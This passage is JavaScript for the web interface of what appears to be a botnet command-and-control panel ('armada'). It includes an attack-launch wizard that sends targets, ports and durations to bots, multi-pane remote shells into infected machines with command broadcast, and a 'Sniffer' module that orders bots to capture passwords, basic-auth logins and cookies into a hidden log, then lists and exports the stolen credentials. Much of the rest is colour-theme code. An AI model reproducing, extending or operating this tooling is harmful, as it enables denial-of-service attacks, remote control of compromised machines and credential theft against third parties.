      '<input type="text" data-key="' + escHtml(opt.key) + '" data-default="' + escHtml(opt.default) + '" value="' + escHtml(opt.default) + '" placeholder="' + escHtml(opt.tooltip) + '">';
    container.appendChild(row);
  });
}

function renderWizardReview() {
  var review = document.getElementById('wiz-review');
  if (!review) return;
  var estBots = Object.keys(botState).length;
  var html = '<div class="wr-row"><span class="wr-label">Method</span><span class="wr-value">' + escHtml(wizState.method.name) + '</span></div>' +
    '<div class="wr-row"><span class="wr-label">Target</span><span class="wr-value">' + escHtml(wizState.target) + ':' + escHtml(wizState.port) + '</span></div>' +
    '<div class="wr-row"><span class="wr-label">Duration</span><span class="wr-value">' + wizState.duration + 's</span></div>';
  if (wizState.filters.arch) html += '<div class="wr-row"><span class="wr-label">Arch Filter</span><span class="wr-value">' + escHtml(wizState.filters.arch) + '</span></div>';
  if (wizState.filters.minRam > 0) html += '<div class="wr-row"><span class="wr-label">Min RAM</span><span class="wr-value">' + wizState.filters.minRam + 'MB</span></div>';
  var optKeys = Object.keys(wizState.options);
  if (optKeys.length > 0) {
    html += '<div class="wr-row"><span class="wr-label">Options</span><span class="wr-value">' +
      optKeys.map(function (k) { return k + '=' + wizState.options[k]; }).join(', ') + '</span></div>';
  }
  html += '<div class="wr-row"><span class="wr-label">Est. Bots</span><span class="wr-value">~' + estBots + '</span></div>';
  review.innerHTML = html;
}

function wizardLaunch() {
  var payload = {
    method: wizState.method.id,
    target: wizState.target,
    port: wizState.port,
    duration: wizState.duration,
    options: wizState.options,
    filters: wizState.filters
  };
  fetch('/api/attack', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Attack launched on ' + d.botCount + ' bots', true);
      wizState.step = 1;
      wizState.method = null;
      renderWizardStep();
      renderMethodGrid(wizState.methods);
    } else {
      showToast(d.error || 'Attack failed', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

// Init wizard on load
wizardInit();


// ===========================================================================
// SHELL SPLIT-PANE
// ===========================================================================
var shellLayout = 'single';
var shellPanes = []; // track active pane bot IDs

function setShellLayout(layout) {
  shellLayout = layout;
  var grid = document.getElementById('shell-grid');
  if (!grid) return;
  grid.className = 'shell-grid ' + layout;
  document.querySelectorAll('.layout-btn').forEach(function (btn) {
    btn.classList.toggle('active', btn.getAttribute('onclick').indexOf("'" + layout + "'") > -1);
  });
  var broadcast = document.getElementById('shell-broadcast');
  if (broadcast) broadcast.style.display = layout === 'single' ? 'none' : '';

  // Determine how many panes this layout needs
  var needed = layout === 'quad' ? 4 : (layout === 'split-h' || layout === 'split-v') ? 2 : 1;

  // Add empty pane slots if needed
  var panes = grid.querySelectorAll('.shell-pane');
  for (var i = panes.length; i < needed; i++) {
    addEmptyPane(grid, i);
  }
  // Remove extra panes if going to fewer
  while (grid.querySelectorAll('.shell-pane').length > needed) {
    var last = grid.querySelector('.shell-pane:last-child');
    if (last && last.id !== 'shell-pane-0') {
      if (last._ws) last._ws.close();
      last.remove();
    } else break;
  }
}

function addEmptyPane(grid, index) {
  var pane = document.createElement('div');
  pane.className = 'shell-pane';
  pane.id = 'shell-pane-' + index;
  pane.innerHTML =
    '<div class="pane-header">' +
    '<span class="pane-botid">Empty Pane</span>' +
    '<select class="pane-bot-select" onchange="attachBotToPane(this,' + index + ')" style="background:var(--bg-input,#0d1117);color:var(--text-primary);border:1px solid var(--border,#30363d);border-radius:4px;padding:2px 6px;font-size:11px;max-width:180px">' +
    '<option value="">-- Select Bot --</option>' +
    '</select>' +
    '<button class="pane-close" onclick="removePane(' + index + ')">&times;</button>' +
    '</div>' +
    '<div class="shell-body" style="flex:1;display:flex;align-items:center;justify-content:center;color:var(--text-dim);font-size:13px">Select a bot above</div>';
  // Populate bot select
  var sel = pane.querySelector('.pane-bot-select');
  Object.keys(botState).forEach(function (id) {
    var opt = document.createElement('option');
    opt.value = id;
    opt.textContent = id + ' (' + botState[id].ip + ')';
    sel.appendChild(opt);
  });
  grid.appendChild(pane);
}

function attachBotToPane(sel, index) {
  var botID = sel.value;
  if (!botID) return;
  var pane = document.getElementById('shell-pane-' + index);
  if (!pane) return;

  // Build a mini terminal in this pane
  pane.innerHTML =
    '<div class="pane-header">' +
    '<span class="pane-botid">' + escHtml(botID) + '</span>' +
    '<span style="color:var(--text-dim);font-size:11px">' + escHtml((botState[botID] || {}).ip || '') + '</span>' +
    '<button class="pane-close" onclick="removePane(' + index + ')">&times;</button>' +
    '</div>' +
    '<div class="shell-body" style="flex:1;display:flex;flex-direction:column;overflow:hidden">' +
    '<div class="shell-terminal" style="flex:1;display:flex;flex-direction:column;overflow:hidden">' +
    '<div class="shell-output" id="pane-output-' + index + '" style="flex:1;overflow-y:auto;padding:8px;font-family:monospace;font-size:13px"></div>' +
    '<div class="shell-input-row" style="padding:4px 8px">' +
    '<span class="prompt">$</span>' +
    '<input type="text" id="pane-input-' + index + '" placeholder="Command..." autocomplete="off" spellcheck="false" style="flex:1;background:transparent;border:none;color:var(--text-primary);font-family:monospace;font-size:13px;outline:none">' +
    '</div>' +
    '</div>' +
    '</div>';

  // Apply current theme
  var savedTheme = localStorage.getItem('armada_shell_theme');
  if (savedTheme) {
    var outputs = pane.querySelectorAll('.shell-output');
    outputs.forEach(function (el) { applyShellTheme(savedTheme); });
  }

  // Connect WebSocket
  var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  var ws = new WebSocket(proto + '//' + location.host + '/ws/shell?botID=' + encodeURIComponent(botID));
  pane._ws = ws;

  var output = document.getElementById('pane-output-' + index);
  ws.onmessage = function (e) {
    if (!output) return;
    var line = document.createElement('div');
    line.textContent = e.data;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
  };

  var input = document.getElementById('pane-input-' + index);
  if (input) {
    input.onkeydown = function (ev) {
      if (ev.key === 'Enter' && input.value.trim()) {
        ws.send(JSON.stringify({ type: 'command', command: input.value.trim() }));
        var echo = document.createElement('div');
        echo.style.color = 'var(--accent,#8b5cf6)';
        echo.textContent = '$ ' + input.value;
        output.appendChild(echo);
        output.scrollTop = output.scrollHeight;
        input.value = '';
      }
    };
  }
}

function removePane(index) {
  var pane = document.getElementById('shell-pane-' + index);
  if (!pane || pane.id === 'shell-pane-0') return;
  if (pane._ws) pane._ws.close();
  pane.remove();
}

function broadcastShellCmd(cmd) {
  if (!cmd.trim()) return;
  document.querySelectorAll('.shell-pane').forEach(function (pane) {
    if (pane._ws && pane._ws.readyState === 1) {
      pane._ws.send(JSON.stringify({ type: 'command', command: cmd.trim() }));
    }
  });
  document.getElementById('shell-broadcast-input').value = '';
}

// ===========================================================================
// TERMINAL THEMES
// ===========================================================================
var SHELL_THEMES = {
  default: { name: 'Default', bg: '#0d1117', fg: '#c9d1d9', cursor: '#58a6ff', black: '#0d1117', red: '#ff7b72', green: '#3fb950', yellow: '#d29922', blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39d353', white: '#c9d1d9', brightBlack: '#484f58', brightRed: '#ffa198', brightGreen: '#56d364', brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff', brightCyan: '#56d364', brightWhite: '#f0f6fc' },
  light: { name: 'Light', bg: '#ffffff', fg: '#1f1f1f', cursor: '#7c3aed', black: '#000000', red: '#d93025', green: '#0d904f', yellow: '#e37400', blue: '#1a73e8', magenta: '#7c3aed', cyan: '#007b83', white: '#ffffff', brightBlack: '#5f6368', brightRed: '#ea4335', brightGreen: '#34a853', brightYellow: '#fbbc04', brightBlue: '#4285f4', brightMagenta: '#9334e6', brightCyan: '#24c1e0', brightWhite: '#ffffff' },
  monokai: { name: 'Monokai', bg: '#272822', fg: '#f8f8f2', cursor: '#f92672', black: '#272822', red: '#f92672', green: '#a6e22e', yellow: '#f4bf75', blue: '#66d9ef', magenta: '#ae81ff', cyan: '#a1efe4', white: '#f8f8f2', brightBlack: '#75715e', brightRed: '#f92672', brightGreen: '#a6e22e', brightYellow: '#f4bf75', brightBlue: '#66d9ef', brightMagenta: '#ae81ff', brightCyan: '#a1efe4', brightWhite: '#f9f8f5' },
  dracula: { name: 'Dracula', bg: '#282a36', fg: '#f8f8f2', cursor: '#ff79c6', black: '#21222c', red: '#ff5555', green: '#50fa7b', yellow: '#f1fa8c', blue: '#bd93f9', magenta: '#ff79c6', cyan: '#8be9fd', white: '#f8f8f2', brightBlack: '#6272a4', brightRed: '#ff6e6e', brightGreen: '#69ff94', brightYellow: '#ffffa5', brightBlue: '#d6acff', brightMagenta: '#ff92df', brightCyan: '#a4ffff', brightWhite: '#ffffff' },
  solarized: { name: 'Solarized', bg: '#002b36', fg: '#839496', cursor: '#268bd2', black: '#073642', red: '#dc322f', green: '#859900', yellow: '#b58900', blue: '#268bd2', magenta: '#d33682', cyan: '#2aa198', white: '#eee8d5', brightBlack: '#586e75', brightRed: '#cb4b16', brightGreen: '#586e75', brightYellow: '#657b83', brightBlue: '#839496', brightMagenta: '#6c71c4', brightCyan: '#93a1a1', brightWhite: '#fdf6e3' },
  nord: { name: 'Nord', bg: '#2e3440', fg: '#d8dee9', cursor: '#88c0d0', black: '#3b4252', red: '#bf616a', green: '#a3be8c', yellow: '#ebcb8b', blue: '#81a1c1', magenta: '#b48ead', cyan: '#88c0d0', white: '#e5e9f0', brightBlack: '#4c566a', brightRed: '#bf616a', brightGreen: '#a3be8c', brightYellow: '#ebcb8b', brightBlue: '#81a1c1', brightMagenta: '#b48ead', brightCyan: '#8fbcbb', brightWhite: '#eceff4' },
  matrix: { name: 'Matrix', bg: '#0a0a0a', fg: '#00ff41', cursor: '#00ff41', black: '#0a0a0a', red: '#00ff41', green: '#00ff41', yellow: '#33ff66', blue: '#00cc33', magenta: '#00ff41', cyan: '#33ff66', white: '#00ff41', brightBlack: '#003300', brightRed: '#33ff66', brightGreen: '#33ff66', brightYellow: '#66ff99', brightBlue: '#33ff66', brightMagenta: '#33ff66', brightCyan: '#66ff99', brightWhite: '#ccffcc' }
};

function applyShellTheme(name) {
  var theme = SHELL_THEMES[name];
  if (!theme) return;
  document.querySelectorAll('.shell-output').forEach(function (el) {
    el.style.setProperty('--term-bg', theme.bg);
    el.style.setProperty('--term-fg', theme.fg);
    el.style.setProperty('--term-cursor', theme.cursor);
    el.style.setProperty('--ansi-black', theme.black);
    el.style.setProperty('--ansi-red', theme.red);
    el.style.setProperty('--ansi-green', theme.green);
    el.style.setProperty('--ansi-yellow', theme.yellow);
    el.style.setProperty('--ansi-blue', theme.blue);
    el.style.setProperty('--ansi-magenta', theme.magenta);
    el.style.setProperty('--ansi-cyan', theme.cyan);
    el.style.setProperty('--ansi-white', theme.white);
    el.style.setProperty('--ansi-bright-black', theme.brightBlack);
    el.style.setProperty('--ansi-bright-red', theme.brightRed);
    el.style.setProperty('--ansi-bright-green', theme.brightGreen);
    el.style.setProperty('--ansi-bright-yellow', theme.brightYellow);
    el.style.setProperty('--ansi-bright-blue', theme.brightBlue);
    el.style.setProperty('--ansi-bright-magenta', theme.brightMagenta);
    el.style.setProperty('--ansi-bright-cyan', theme.brightCyan);
    el.style.setProperty('--ansi-bright-white', theme.brightWhite);
    el.style.background = theme.bg;
    el.style.color = theme.fg;
  });
  // Update xterm.js PTY terminal if open
  if (typeof ptyTerm !== 'undefined' && ptyTerm) {
    ptyTerm.options.theme = {
      background: theme.bg,
      foreground: theme.fg,
      cursor: theme.cursor,
      selectionBackground: theme.bg === '#ffffff' ? '#b4d7ff' : '#264f78',
      black: theme.black,
      red: theme.red,
      green: theme.green,
      yellow: theme.yellow,
      blue: theme.blue,
      magenta: theme.magenta,
      cyan: theme.cyan,
      white: theme.white
    };
  }
  localStorage.setItem('armada_shell_theme', name);
}

// Populate shell theme picker on load
(function () {
  var picker = document.getElementById('shell-theme-picker');
  if (!picker) return;
  Object.keys(SHELL_THEMES).forEach(function (key) {
    var opt = document.createElement('option');
    opt.value = key;
    opt.textContent = SHELL_THEMES[key].name;
    picker.appendChild(opt);
  });
  var saved = localStorage.getItem('armada_shell_theme');
  if (saved && SHELL_THEMES[saved]) {
    picker.value = saved;
    applyShellTheme(saved);
  }
})();

// ===========================================================================
// GLOBAL PANEL THEMES
// ===========================================================================
var GLOBAL_THEMES = {
  default: { name: 'Default (Dark)', bgBase: '#06080c', bgPrimary: '#0c1018', bgCard: '#111827', bgCardHover: '#1a2332', bgInput: '#0f1520', bgElevated: '#182234', border: '#1e2d3d', borderLight: '#253344', text: '#e2e8f0', textMuted: '#64748b', textDim: '#475569', accent: '#8b5cf6', accentHover: '#7c3aed', green: '#22c55e', red: '#ef4444', yellow: '#eab308', blue: '#3b82f6', cyan: '#06b6d4', headerBg: 'rgba(12,16,24,0.8)' },
  light: { name: 'Light', bgBase: '#f5f5f5', bgPrimary: '#ffffff', bgCard: '#ffffff', bgCardHover: '#f0f0f3', bgInput: '#f5f5f5', bgElevated: '#e8eaed', border: '#dadce0', borderLight: '#c4c7cc', text: '#1f1f1f', textMuted: '#5f6368', textDim: '#80868b', accent: '#7c3aed', accentHover: '#6d28d9', green: '#0d904f', red: '#d93025', yellow: '#e37400', blue: '#1a73e8', cyan: '#007b83', headerBg: 'rgba(255,255,255,0.85)' },
  monokai: { name: 'Monokai', bgBase: '#1a1a17', bgPrimary: '#272822', bgCard: '#2e2f28', bgCardHover: '#3a3b32', bgInput: '#1e1f1a', bgElevated: '#3e3d32', border: '#49483e', borderLight: '#5a5949', text: '#f8f8f2', textMuted: '#a59f85', textDim: '#75715e', accent: '#f92672', accentHover: '#e6195f', green: '#a6e22e', red: '#f92672', yellow: '#e6db74', blue: '#66d9ef', cyan: '#a1efe4', headerBg: 'rgba(39,40,34,0.9)' },
  dracula: { name: 'Dracula', bgBase: '#1e1f29', bgPrimary: '#282a36', bgCard: '#2d2f3d', bgCardHover: '#343746', bgInput: '#21222c', bgElevated: '#383a4a', border: '#44475a', borderLight: '#555869', text: '#f8f8f2', textMuted: '#8a8ea0', textDim: '#6272a4', accent: '#bd93f9', accentHover: '#a87cf5', green: '#50fa7b', red: '#ff5555', yellow: '#f1fa8c', blue: '#8be9fd', cyan: '#8be9fd', headerBg: 'rgba(40,42,54,0.9)' },
  solarized: { name: 'Solarized Dark', bgBase: '#001e26', bgPrimary: '#002b36', bgCard: '#073642', bgCardHover: '#0a4050', bgInput: '#002028', bgElevated: '#0a4050', border: '#2a5a68', borderLight: '#3a6a78', text: '#839496', textMuted: '#657b83', textDim: '#586e75', accent: '#268bd2', accentHover: '#1a7ab8', green: '#859900', red: '#dc322f', yellow: '#b58900', blue: '#268bd2', cyan: '#2aa198', headerBg: 'rgba(0,43,54,0.9)' },
  nord: { name: 'Nord', bgBase: '#242933', bgPrimary: '#2e3440', bgCard: '#3b4252', bgCardHover: '#434c5e', bgInput: '#2a303c', bgElevated: '#434c5e', border: '#4c566a', borderLight: '#5c6678', text: '#d8dee9', textMuted: '#9ba4b5', textDim: '#7b849a', accent: '#88c0d0', accentHover: '#7ab3c3', green: '#a3be8c', red: '#bf616a', yellow: '#ebcb8b', blue: '#81a1c1', cyan: '#88c0d0', headerBg: 'rgba(46,52,64,0.9)' },
  matrix: { name: 'Matrix', bgBase: '#030503', bgPrimary: '#0a0a0a', bgCard: '#0f120f', bgCardHover: '#151a15', bgInput: '#060806', bgElevated: '#151a15', border: '#1a2e1a', borderLight: '#254025', text: '#00ff41', textMuted: '#00aa2a', textDim: '#007718', accent: '#00ff41', accentHover: '#33ff66', green: '#00ff41', red: '#ff0000', yellow: '#33ff66', blue: '#00cc33', cyan: '#33ff66', headerBg: 'rgba(10,10,10,0.9)' }
};

function applyGlobalTheme(name) {
  var t = GLOBAL_THEMES[name];
  if (!t) return;
  var r = document.documentElement;
  // Set or remove light theme attribute
  if (name === 'light') {
    r.setAttribute('data-theme', 'light');
  } else {
    r.removeAttribute('data-theme');
  }
  r.style.setProperty('--bg-base', t.bgBase);
  r.style.setProperty('--bg-primary', t.bgPrimary);
  r.style.setProperty('--bg-card', t.bgCard);
  r.style.setProperty('--bg-card-hover', t.bgCardHover);
  r.style.setProperty('--bg-input', t.bgInput);
  r.style.setProperty('--bg-elevated', t.bgElevated);
  r.style.setProperty('--border', t.border);
  r.style.setProperty('--border-light', t.borderLight);
  r.style.setProperty('--text', t.text);
  r.style.setProperty('--text-muted', t.textMuted);
  r.style.setProperty('--text-dim', t.textDim);
  r.style.setProperty('--accent', t.accent);
  r.style.setProperty('--accent-hover', t.accentHover);
  r.style.setProperty('--accent-glow', t.accent.replace(')', ',0.15)').replace('#', 'rgba('));
  r.style.setProperty('--green', t.green);
  r.style.setProperty('--green-dim', t.green + '1f');
  r.style.setProperty('--red', t.red);
  r.style.setProperty('--red-dim', t.red + '1f');
  r.style.setProperty('--yellow', t.yellow);
  r.style.setProperty('--yellow-dim', t.yellow + '1f');
  r.style.setProperty('--blue', t.blue);
  r.style.setProperty('--blue-dim', t.blue + '1f');
  r.style.setProperty('--cyan', t.cyan);
  r.style.setProperty('--header-bg', t.headerBg);
  document.body.style.background = t.bgBase;
  localStorage.setItem('armada_global_theme', name);
  // Also sync shell theme
  if (SHELL_THEMES[name]) {
    applyShellTheme(name);
    var shellPicker = document.getElementById('shell-theme-picker');
    if (shellPicker) shellPicker.value = name;
  }
}

// Populate global theme picker and restore saved
(function () {
  var picker = document.getElementById('global-theme-picker');
  if (!picker) return;
  Object.keys(GLOBAL_THEMES).forEach(function (key) {
    var opt = document.createElement('option');
    opt.value = key;
    opt.textContent = GLOBAL_THEMES[key].name;
    picker.appendChild(opt);
  });
  var saved = localStorage.getItem('armada_global_theme');
  if (saved && GLOBAL_THEMES[saved]) {
    picker.value = saved;
    applyGlobalTheme(saved);
  }
})();

// ---------------------------------------------------------------------------
// Sniffer — per-bot passive credential capture
// ---------------------------------------------------------------------------

var _sniffActiveBotID = '';

function snifferRefresh() {
  // Populate bot dropdown from current bot table
  var sel = document.getElementById('sniff-bot');
  if (!sel) return;
  var rows = document.querySelectorAll('.bot-row');
  var prev = sel.value;
  sel.innerHTML = '<option value="">Select a bot...</option>';
  rows.forEach(function (row) {
    var id = row.getAttribute('data-botid');
    if (id) {
      var opt = document.createElement('option');
      opt.value = id;
      opt.textContent = id;
      sel.appendChild(opt);
    }
  });
  if (prev) sel.value = prev;
}

function snifferStart() {
  var botID = document.getElementById('sniff-bot').value;
  if (!botID) { showToast('Select a bot first', false); return; }
  var logpath = document.getElementById('sniff-logpath').value.trim() || '/tmp/.sniff.log';
  _sniffActiveBotID = botID;
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: '!sniff ' + logpath, botID: botID })
  }).then(function (r) { return r.json(); }).then(function (d) {
    showToast(d.message || 'Sniffer start sent', d.success !== false);
    document.getElementById('sniff-status').textContent = 'Starting on ' + botID + '...';
    sniffLog('Sent !sniff ' + logpath + ' to ' + botID);
  }).catch(function () { showToast('Request failed', false); });
}

function snifferStop() {
  var botID = document.getElementById('sniff-bot').value || _sniffActiveBotID;
  if (!botID) { showToast('Select a bot first', false); return; }
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: '!stopsniff', botID: botID })
  }).then(function (r) { return r.json(); }).then(function (d) {
    showToast(d.message || 'Sniffer stop sent', d.success !== false);
    document.getElementById('sniff-status').textContent = 'Stopped';
    sniffLog('Sent !stopsniff to ' + botID);
  }).catch(function () { showToast('Request failed', false); });
}

function snifferDownloadLog() {
  window.location = '/api/hits/export?mod=sniff&format=csv';
}

function handleSniffStats(data) {
  // data = { botID: "...", raw: "SNIFF|post:N|basic:N|cookie:N|url:N|total:N" }
  if (!data || !data.raw) return;
  var parts = data.raw.split('|');
  var vals = {};
  for (var i = 1; i < parts.length; i++) {
    var kv = parts[i].split(':');
    if (kv.length === 2) vals[kv[0]] = parseInt(kv[1], 10) || 0;
  }
  var el;
  el = document.getElementById('sniff-cnt-post'); if (el) el.textContent = vals.post || 0;
  el = document.getElementById('sniff-cnt-basic'); if (el) el.textContent = vals.basic || 0;
  el = document.getElementById('sniff-cnt-cookie'); if (el) el.textContent = vals.cookie || 0;
  el = document.getElementById('sniff-cnt-url'); if (el) el.textContent = vals.url || 0;
  el = document.getElementById('sniff-cnt-total'); if (el) el.textContent = vals.total || 0;

  sniffLog('[' + data.botID + '] post:' + (vals.post || 0) + ' basic:' + (vals.basic || 0) +
    ' cookie:' + (vals.cookie || 0) + ' url:' + (vals.url || 0) + ' total:' + (vals.total || 0));

  var status = document.getElementById('sniff-status');
  if (status) status.textContent = 'Running on ' + data.botID + ' — ' + (vals.total || 0) + ' hits';
}

function sniffLog(msg) {
  var el = document.getElementById('sniff-log');
  if (!el) return;
  var ts = new Date().toLocaleTimeString();
  var line = document.createElement('div');
  line.textContent = '[' + ts + '] ' + msg;
  el.appendChild(line);
  el.scrollTop = el.scrollHeight;
  // Keep last 200 lines
  while (el.childNodes.length > 200) el.removeChild(el.firstChild);
}

// --- Sniff Hits Table ---

function handleSniffHitSSE(hit) {
  // Real-time: prepend to table
  var tbody = document.getElementById('sniff-hits-tbody');
  if (!tbody) return;
  var tr = document.createElement('tr');
  var typeColors = { post: 'var(--green)', basic: 'var(--cyan)', cookie: 'var(--orange,#f0883e)', url: 'var(--purple,#a371f7)' };
  var ts = hit.t ? new Date(hit.t).toLocaleTimeString() : '';
  tr.innerHTML =
    '<td style="color:' + (typeColors[hit.sniffType] || 'var(--text)') + ';font-weight:700">' + escHtml(hit.sniffType || '') + '</td>' +
    '<td>' + escHtml(hit.ip || '') + '</td>' +
    '<td>' + escHtml(hit.user || '') + '</td>' +
    '<td>' + escHtml(hit.pass || '') + '</td>' +
    '<td style="font-size:11px;opacity:0.7">' + escHtml(hit.botID || '') + '</td>' +
    '<td style="font-size:11px;opacity:0.6">' + ts + '</td>';
  tbody.insertBefore(tr, tbody.firstChild);
  sniffLog('HIT [' + (hit.sniffType || '?') + '] ' + (hit.ip || '?') + ' ' + (hit.user || '') + ':' + (hit.pass || ''));
}

function sniffRefreshHits() {
  fetch('/api/hits?mod=sniff&limit=500').then(function (r) { return r.json(); }).then(function (hits) {
    var tbody = document.getElementById('sniff-hits-tbody');
    if (!tbody) return;
    tbody.innerHTML = '';
    var typeColors = { post: 'var(--green)', basic: 'var(--cyan)', cookie: 'var(--orange,#f0883e)', url: 'var(--purple,#a371f7)' };
    (hits || []).reverse().forEach(function (h) {
      var tr = document.createElement('tr');
      var ts = h.t ? new Date(h.t).toLocaleTimeString() : '';
      tr.innerHTML =
        '<td style="color:' + (typeColors[h.sniffType] || 'var(--text)') + ';font-weight:700">' + escHtml(h.sniffType || '') + '</td>' +
        '<td>' + escHtml(h.ip || '') + '</td>' +
        '<td>' + escHtml(h.user || '') + '</td>' +
        '<td>' + escHtml(h.pass || '') + '</td>' +
        '<td style="font-size:11px;opacity:0.7">' + escHtml(h.botID || '') + '</td>' +
        '<td style="font-size:11px;opacity:0.6">' + ts + '</td>';
      tbody.appendChild(tr);
    });
  }).catch(function () { showToast('Failed to load sniff hits', false); });
}

function sniffExportCSV() { window.location = '/api/hits/export?mod=sniff&format=csv'; }
function sniffExportTxt() { window.location = '/api/hits/export?mod=sniff&format=txt'; }

function sniffClearHits() {
  if (!confirm('Clear all sniff hits?')) return;
  fetch('/api/hits?mod=sniff', { method: 'DELETE' }).then(function (r) { return r.json(); }).then(function () {
    showToast('Sniff hits cleared', true);
    document.getElementById('sniff-hits-tbody').innerHTML = '';
  }).catch(function () { showToast('Failed', false); });
}
